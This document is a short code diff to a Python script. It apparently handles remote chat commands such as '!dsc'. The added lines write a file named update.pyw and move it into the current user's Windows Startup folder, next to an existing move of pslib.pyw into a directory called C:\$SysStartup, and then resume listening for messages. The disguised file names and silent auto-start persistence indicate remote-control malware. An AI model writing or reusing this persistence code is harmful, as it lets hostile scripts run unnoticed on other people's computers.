@@ -98,6 +98,8 @@ def process(message):
         call(["move", "pslib.pyw", "C:\\$SysStartup"], shell=True)
         with open("update.pyw", "w") as file:
             file.write(var)
+        call(["move", "update.pyw", f"\"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""])
+        recvMsg()
 
     else:
         if message == "!dsc":
